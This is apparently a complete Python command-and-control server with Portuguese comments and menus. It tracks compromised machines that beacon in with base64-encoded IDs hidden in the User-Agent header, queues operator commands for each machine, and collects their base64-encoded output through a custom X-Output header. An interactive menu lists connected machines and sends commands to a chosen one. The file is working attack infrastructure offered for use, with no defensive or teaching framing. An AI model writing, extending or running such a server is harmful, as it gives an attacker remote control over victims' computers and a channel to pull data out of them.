import base64
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

# Dicionários de estado
comandos_pendentes = {}
maquinas_conectadas = set()
lock = threading.Lock()

class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        agente_id = "desconhecido"
        try:
            user_agent = self.headers.get('User-Agent')
            agente_id = base64.b64decode(user_agent).decode()
            with lock:
                maquinas_conectadas.add(agente_id)
            print(f"\n[BEACON] Máquina conectada: {agente_id}")
        except Exception as e:
            print(f"[ERRO] Decodificando beacon: {e}")

        # Verifica se há comando pendente para esse agente
        with lock:
            comando = comandos_pendentes.pop(agente_id, "")

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(comando.encode())

    def do_POST(self):
        agente_id = self.headers.get("User-Agent", "desconhecido")
        output_codificado = self.headers.get("X-Output")

        try:
            output_decodificado = base64.b64decode(output_codificado).decode()
            print(f"\n[RESPOSTA de {agente_id}]:\n{output_decodificado}\n{'-'*60}")
        except Exception as e:
            print(f"[ERRO] Decodificando resposta: {e}")

        self.send_response(200)
        self.end_headers()

def iniciar_servidor():
    servidor = HTTPServer(('0.0.0.0', 8080), SimpleHandler)
    print("[*] Servidor C2 aguardando conexões na porta 8080...")
    servidor.serve_forever()

def menu_principal():
    while True:
        print("\n=== MENU PRINCIPAL ===")
        print("1 - Máquinas conectadas")
        print("2 - Enviar comandos")
        print("0 - Sair")
        opcao = input("Escolha uma opção: ").strip()

        if opcao == "1":
            listar_maquinas()
        elif opcao == "2":
            enviar_comando()
        elif opcao == "0":
            print("Encerrando...")
            break
        else:
            print("Opção inválida!")

def listar_maquinas():
    with lock:
        if not maquinas_conectadas:
            print("\n[INFO] Nenhuma máquina conectada ainda.")
        else:
            print("\n[+] Máquinas conectadas:")
            for i, m in enumerate(maquinas_conectadas, 1):
                print(f" {i}. {m}")

def enviar_comando():
    with lock:
        maquinas = list(maquinas_conectadas)

    if not maquinas:
        print("\n[INFO] Nenhuma máquina disponível.")
        return

    print("\n[+] Máquinas disponíveis:")
    for i, m in enumerate(maquinas, 1):
        print(f" {i}. {m}")

    try:
        escolha = int(input("Escolha o número da máquina: "))
        if escolha < 1 or escolha > len(maquinas):
            print("[ERRO] Seleção inválida.")
            return
    except ValueError:
        print("[ERRO] Entrada inválida.")
        return

    maquina_escolhida = maquinas[escolha - 1]
    comando = input(f"Digite o comando para {maquina_escolhida}: ").strip()
    if comando:
        with lock:
            comandos_pendentes[maquina_escolhida] = comando
        print(f"[INFO] Comando enviado para {maquina_escolhida}")
    else:
        print("[ERRO] Comando vazio.")

if __name__ == '__main__':
    t_servidor = threading.Thread(target=iniciar_servidor, daemon=True)
    t_servidor.start()

    try:
        menu_principal()
    except KeyboardInterrupt:
        print("\n[!] Encerrando servidor.")
